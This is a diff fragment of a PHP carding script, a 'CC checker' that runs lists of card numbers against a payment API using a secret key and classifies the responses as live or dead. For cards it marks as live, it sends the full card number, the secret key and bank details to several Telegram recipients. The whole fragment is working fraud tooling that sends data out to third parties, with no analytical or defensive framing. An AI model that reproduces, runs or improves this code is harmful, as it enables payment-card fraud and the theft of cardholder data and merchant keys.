+    send_message($userid3, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: 32DS REQUIRED</span><br>';
+} 
+elseif(strpos($result1, "card_error_authentication_required")) {
+    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid4, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid3, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: 32DS REQUIRED</span><br>';
+} 
+elseif(strpos($result2, "incorrect_cvc" )) {
+    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid4, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid3, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: Security code is incorrect</span><br>';
+}
+elseif(strpos($result2, "pickup_card" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: PICKUP CARD</span><br>';
+}
+elseif(strpos($result2, "pickup_card" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: PICKUP CARD</span><br>';
+}
+elseif(strpos($result2, 'Your card has expired.')) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: EXPIRED CARD</span><br>';
+}
+elseif(strpos($result2, 'Your card has expired.')) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: EXPIRED CARD</span><br>';
+}
+elseif(strpos($result2, "card_decline_rate_limit_exceeded")) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: SK IS AT RATE LIMIT</span><br>';
+}
+elseif(strpos($result2, '"code": "processing_error"')) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: PROCESSING ERROR</span><br>';
+}
+elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: YOUR CARD NUMBER IS INCORRECT</span><br>';
+}
+elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: SERVICE NOT ALLOWED</span><br>';
+}
+elseif(strpos($result2, '"code": "processing_error"')) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: PROCESSING ERROR</span><br>';
+}
+elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: YOUR CARD NUMBER IS INCORRECT</span><br>';
+}
+elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: SERVICE NOT ALLOWED</span><br>';
+}
+elseif(strpos($result, "incorrect_number")) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: INCORRECT CARD NUMBER</span><br>';
+}
+elseif(strpos($result1, "incorrect_number")) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: INCORRECT CARD NUMBER</span><br>';
+}
 elseif(strpos($result1, "do_not_honor")) {
-    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR ❌ </span><br>';
-
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: DO NOT HONOR</span><br>';
 }
-
-
-elseif(strpos($result1, "fraudulent")) {
-    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT ❌ </span><br>';
-
+elseif(strpos($result1, 'Your card was declined.')) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: CARD DECLINED</span><br>';
 }
-
-elseif(strpos($result2, "Your card number is incorrect.")) {
-    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INCORRECT CARD NUMBER ❌ </span><br>';
-
+elseif(strpos($result1, "do_not_honor")) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: DO NOT HONOR</span><br>';
 }
-
-elseif(strpos($result2, "Unkown Error Generation Your Account.")) {
-    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED ❌ </span><br>';
-
+elseif(strpos($result2, "generic_decline")) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: GENERIC CARD</span><br>';
 }
-
-
+elseif(strpos($result, 'Your card was declined.')) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: CARD DECLINED</span><br>';
+}
+elseif(strpos($result2,' "decline_code": "do_not_honor"')){
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: DO NOT HONOR</span><br>';
+}
+elseif(strpos($result2,'"cvc_check": "unchecked"')){
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: CVC_UNCHECKED : INFORM AT OWNER</span><br>';
+}
+elseif(strpos($result2,'"cvc_check": "fail"')){
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: CVC_CHECK : FAIL</span><br>';
+}
+elseif(strpos($result2, "card_not_supported")) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: CARD NOT SUPPORTED</span><br>';
+}
+elseif(strpos($result2,'"cvc_check": "unavailable"')){
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: CVC_CHECK : UNVAILABLE</span><br>';
+}
+elseif(strpos($result2,'"cvc_check": "unchecked"')){
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: CVC_UNCHECKED : INFORM TO OWNER」</span><br>';
+}
+elseif(strpos($result2,'"cvc_check": "fail"')){
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: CVC_CHECKED : FAIL</span><br>';
+}
+elseif(strpos($result2,"currency_not_supported")) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: CURRENCY NOT SUPORTED TRY IN INR</span><br>';
+}
+elseif (strpos($result,'Your card does not support this type of purchase.')) {
+    echo 'DEAD</span> CC:  '.$lista.'</span>  <br>➤ Result: CARD NOT SUPPORT THIS TYPE OF PURCHASE</span><br>';
+}
+elseif(strpos($result2,'"cvc_check": "pass"')){
+    send_message($userid, "<b>⚜️CC:</b> <code>$lista</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid4, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    send_message($userid3, "<b>⚜️Public's CC:</b> <code>$lista</code>\r\n<b>⚜️SK:</b> <code>$sk</code>\r\n<b>⚜️RESPONSE: CVV ✅</b>\r\n<b>⚜️Bin: $brand $category $type</b>\r\n<b>⚜️Bank: $bank</b>\r\n<b>⚜️Country: $country $emoji</b>\r\n<b>⚜️BY ➔ 𝙅𝙚𝙩𝙞𝙭</b>");
+    echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: CVV LIVE</span><br>';
+}
+elseif(strpos($result2, "fraudulent" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: FRAUDULENT</span><br>';
+}
+elseif(strpos($result1, "testmode_charges_only" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: SK KEY DEAD OR INVALID</span><br>';
+}
+elseif(strpos($result1, "api_key_expired" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: SK KEY REVOKED</span><br>';
+}
+elseif(strpos($result1, "parameter_invalid_empty" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: ENTER CC TO CHECK</span><br>';
+}
+elseif(strpos($result1, "card_not_supported" )) {
+    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>➤ Result: CARD NOT SUPPORTED</span><br>';
+}
 else {
-
-    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CCN LIVE ✅</span><br>';
-
+    echo 'DEAD</span> CC:  '.$lista.'</span>  <br>➤ Result: INCREASE AMOUNT OR TRY ANOTHER CARD</span><br>';
 }
 
-//===========================================[Responses-END]========================================//
+//echo "<br><b>Lista:</b> $lista<br>";
+//echo "<br><b>CVV Check:</b> $cvccheck<br>";
+//echo "<b>D_Code:</b> $dcode<br>";
+//echo "<b>Reason:</b> $reason<br>";
+//echo "<b>Risk Level:</b> $riskl<br>";
+//echo "<b>Seller Message:</b> $seller_msg<br>";
+
+echo " ➤ Bypassing: $x <br>";
+
+//echo "<br><b>Result3: </b> $result2<br>";
 
 curl_close($ch);
 ob_flush();
-
-//echo "<b>1REQ Result:</b> $result1<br><br>";
-//echo "<b>2REQ Result:</b> $result2<br><br>";
-
-//============================================================================//
-//=======================[B3 RAW-MADE BY 𝑫𝑹𝑨𝑮𝑶𝑵#𝑴𝑨𝑺𝑻𝑬𝑹]====================//
-//============================================================================//
 
 ?>
